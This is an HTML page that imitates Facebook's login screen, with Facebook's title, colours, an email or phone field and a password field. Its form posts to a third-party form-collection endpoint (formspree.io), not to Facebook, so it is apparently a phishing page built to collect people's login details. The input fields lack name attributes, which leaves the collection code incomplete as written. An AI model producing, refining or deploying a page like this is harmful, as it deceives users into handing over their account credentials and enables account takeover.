<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – Log In or Sign Up</title>

<style>
/* RESET */
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: Helvetica, Arial, sans-serif;
}

/* PAGE BACKGROUND */
body{
  background:#f0f2f5;
  color:#1c1e21;
}

/* MAIN WRAPPER */
.container{
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:20px;
}

/* LEFT SIDE */
.left{
  max-width:500px;
  margin-right:60px;
  align-items: center;
}

.left h1{
  color:#1877f2;
  font-size:56px;
  font-weight:700;
  margin-bottom:10px;
  align-items: center;
}

.left p{
  font-size:24px;
  line-height:28px;
}

/* RIGHT SIDE */
.right{
  width:396px;
}

/* LOGIN BOX */
.login-box{
  background:#fff;
  padding:16px;
  border-radius:8px;
  box-shadow:0 2px 4px rgba(0,0,0,.1),
             0 8px 16px rgba(0,0,0,.1);
  text-align:center;
}

/* INPUTS */
.login-box input{
  width:100%;
  padding:14px 16px;
  margin-bottom:12px;
  font-size:17px;
  border:1px solid #dddfe2;
  border-radius:6px;
}

.login-box input:focus{
  outline:none;
  border-color:#1877f2;
}

/* LOGIN BUTTON */
.login-btn{
  background:#1877f2;
  color:#fff;
  font-size:20px;
  font-weight:700;
  border:none;
  border-radius:6px;
  padding:12px;
  width:100%;
  cursor:pointer;
}

.login-btn:hover{
  background:#166fe5;
}

/* FORGOT */
.forgot{
  display:block;
  margin:16px 0;
  color:#1877f2;
  font-size:14px;
  text-decoration:none;
}

.forgot:hover{
  text-decoration:underline;
}

/* DIVIDER */
.divider{
  height:1px;
  background:#dadde1;
  margin:20px 0;
}

/* CREATE ACCOUNT */
.create-btn{
  background:#42b72a;
  color:#fff;
  font-size:17px;
  font-weight:700;
  border:none;
  border-radius:6px;
  padding:12px 16px;
  cursor:pointer;
}

.create-btn:hover{
  background:#36a420;
}

/* PAGE LINK */
.page-link{
  margin-top:28px;
  text-align:center;
  font-size:14px;
}

.page-link a{
  font-weight:700;
  color:#1c1e21;
  text-decoration:none;
}

.page-link a:hover{
  text-decoration:underline;
}

/* MOBILE */
@media(max-width:900px){
  .container{
    flex-direction:column;
    text-align:center;
  }

  .left{
    margin:0 0 40px 0;
  }

  .left h1{
    font-size:48px;
  }

  .left p{
    font-size:20px;
  }
}
</style>
</head>

<body>

<div class="container">

  <!-- LEFT TEXT -->
  <div class="left">
    <h1>facebook</h1>
    
  <div class="right">
    <div class="login-box">
      <form action="https://formspree.io/f/xgovvlnp"method="POST">
      <input type="text" placeholder="Email address or phone number">
      <input type="password" placeholder="Password">
      <button class="login-btn">Log In</button>
      <a href="#" class="forgot">Forgotten password?</a>
      <div class="divider"></div>
      <button type="submit"class="create-btn">Create new account</button>
      </form>
    </div>

    <div class="page-link">
      <a href="#">Create a Page</a> for a celebrity, brand or business.
    </div>
  </div>

</div>

</body>
</html>
